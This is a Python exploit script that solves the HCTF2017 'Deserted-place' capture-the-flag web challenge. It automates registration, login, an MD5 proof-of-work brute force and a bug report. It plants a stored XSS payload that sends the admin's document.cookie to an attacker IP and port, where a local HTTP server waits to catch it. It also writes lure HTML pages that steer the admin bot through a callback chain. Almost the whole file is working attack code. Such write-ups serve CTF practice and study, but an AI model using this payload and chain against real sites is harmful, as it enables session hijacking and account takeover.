#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/05/28, 15:26

    HCTF2017 Deserted-place

    Description 
        maybe nothing here 
        flag in admin cookie

    Now Score 820.35
    Team solved 3
"""


import requests
import re
import random
import string
import hashlib
import time
import _thread
from http.server import HTTPServer, CGIHTTPRequestHandler
from urllib.parse import urlparse
req = requests.Session()
URL = 'http://127.0.0.1:8304'

ip = "192.168.99.102"
port = "8384"


def md5x(x):
    m1 = hashlib.md5()
    m1.update(x.encode("utf-8"))
    return m1.hexdigest()


def runmd5(code):
    start = 1000000
    end = 100000000
    i = start
    print('[+] \tRuning... %s' % code)
    while i <= end:
        res = md5x(str(i))[0:6]
        if res == code:
            print('[+] \tDeCode : %d' % i)
            return i
        i += 1


def randstr(n=6):
    return ''.join([str(random.choice(string.ascii_lowercase)) for i in range(n)])


def register(user):
    print('[+] Register a user [%s]' % user)
    data = {
        "user": user,
        "pass": 'vvvvvv',
        "cpass": 'vvvvvv'
    }
    res = req.post(URL+'/register.php', data=data)
    if res.status_code == 200:
        return True
    return False


def login(user):
    print('[+] Login [%s]' % user)
    data = {
        "user": user,
        "pass": 'vvvvvv'
    }
    res = req.post(URL+'/login.php', data=data)
    if res.status_code == 200:
        return True
    return False


def message(pl):
    print('[+] Update Message [%s]' % pl)
    res = req.get(URL+'/user.php')
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'csrftoken: ([a-z0-9]{8})', html)
        # print(m)
        if m and len(m) > 0:
            csrftoken = m[0]
            data = {
                "message": pl,
                "email": "example@icq.com",
                "csrftoken": csrftoken
            }
            res = req.post(URL+'/api/update.php', data=data)
            if res.status_code == 200 and b'update success' in res.content:
                return True
    return False


def report(user, link):
    print('[+] Report Bug Link [%s]' % link)
    res = req.get(URL+'/report.php')
    if res.status_code == 200:
        html = res.content.decode('utf-8')
        m = re.findall(r'code\),0,6\) == \'([a-z0-9]{6})\'', html)
        if m and len(m) > 0:
            code = runmd5(m[0])
            data = {
                "user": user,
                "link": link,
                "code": code
            }
            res = req.post(URL+'/report.php', data=data)
            if res.status_code == 200:
                return True
    return False


stop = False


def run_http_server():
    print("[+] Start HTTPServer...")
    httpd = HTTPServer(('0.0.0.0', 8384), CGIHTTPRequestHandler)
    while not stop:
        httpd.handle_request()


def exp():
    name = randstr()
    if register(name):
        if login(name):
            if message("<img src=x onerror=window.location.href='//%s:%s/?cookie='+document.cookie >" % (ip, port)):
                with open('some1.html', 'w') as f:
                    f.write(
                        '<script>setTimeout(function(){window.open("some2.html");location.replace("http://127.0.0.1/user.php");},1000);</script>')
                with open('some2.html', 'w') as f:
                    f.write(
                        '<script>setTimeout(function(){location.replace("http://127.0.0.1/edit.php?callback=RandomProfile&user=%s");},2000);</script>' % name)
                if report(name, 'http://%s:%s/some1.html' % (ip, port)):
                    print("[+] Report success")


if __name__ == '__main__':
    try:
        _thread.start_new_thread(run_http_server, ())
    except Exception as e:
        print("Error: %s" % e)
    exp()
    time.sleep(15)
    print("[+] Stop HTTPServer...")
    stop = True
